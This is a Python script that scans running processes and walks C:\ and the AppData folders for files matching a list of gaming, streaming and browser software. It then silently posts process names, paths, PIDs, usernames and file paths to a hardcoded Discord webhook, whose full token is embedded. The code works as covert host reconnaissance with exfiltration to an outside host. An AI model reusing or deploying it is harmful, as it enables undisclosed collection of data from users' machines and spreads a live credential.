import os
import requests
import sys
import psutil
from datetime import datetime
from pathlib import Path

# Define webhooks
WEBHOOKS = {
    'process_traces': 'https://canary.discord.com/api/webhooks/1279148419193114694/l4pr5CEMMlD4LDsZ9_plYFSfTgWCVvWqXCN9Gri6XVq8bRL55GZtgNZXGOU1TrY34SCV',
}

# Define processes to look for
PROCESSES_TO_FIND = [
    'LGHUB',
    'TikTokLIVEStudio',
    'voicemeeterpro',
    'grave',
    'RazerCortex',
    'RazerSynapse',
    'spotify',
    'steam',
    'chrome',
]

def send_webhook(webhook_url, content):
    try:
        response = requests.post(webhook_url, json={'content': content})
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Failed to send webhook: {e}")

def scan_directory(directory, trace_file):
    results = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if any(proc.lower() in file.lower() for proc in PROCESSES_TO_FIND):
                results.append(f"Found trace: {file_path}")
    with open(trace_file, 'a') as f:
        for result in results:
            f.write(result + '\n')
    return results

def check_processes():
    results = []
    for proc in psutil.process_iter(['pid', 'name', 'username', 'exe']):
        try:
            if proc.info['name'] in PROCESSES_TO_FIND:
                result = f"Process: {proc.info['name']} | PID: {proc.info['pid']} | Path: {proc.info['exe']} | User: {proc.info['username']}"
                if proc.info['username'] == 'SYSTEM' or proc.info['username'] == 'admin':  # Check if admin
                    result += " | Admin"
                results.append(result)
        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
            continue
    return results

def main():
    if len(sys.argv) < 2:
        print("No option provided.")
        return

    option = sys.argv[1]
    if option != '--scan-directory':
        print("Invalid option.")
        return

    output_folder = os.path.join(Path.home(), 'AppData', 'MyPythonScript')
    Path(output_folder).mkdir(parents=True, exist_ok=True)
    results_log_path = os.path.join(output_folder, 'results.txt')
    error_log_path = os.path.join(output_folder, 'error_log.txt')

    directories_to_scan = [
        "C:\\",  # Root directory
        "C:\\Users\\%USERNAME%\\AppData\\Local",  # AppData Local
        "C:\\Users\\%USERNAME%\\AppData\\Roaming"  # AppData Roaming
        # Add more directories as needed
    ]

    try:
        # Check processes
        process_results = check_processes()
        if process_results:
            print("Scanning processes...")
            send_webhook(WEBHOOKS['process_traces'], "\n".join(process_results))
        else:
            print("No target processes found.")

        for directory in directories_to_scan:
            directory = directory.replace('%USERNAME%', os.getlogin())
            print(f"Scanning through folder {directory}")
            results = scan_directory(directory, results_log_path)
            if results:
                print(f"Found traces in {directory} - See results.txt for details.")
                send_webhook(WEBHOOKS['process_traces'], "\n".join(results))
            else:
                print(f"Folder {directory} is clear.")
    except Exception as e:
        with open(error_log_path, 'a') as f:
            f.write(f"Error: {e}\n")
        print(f"Script execution completed. Check the error log for details.")

if __name__ == "__main__":
    main()
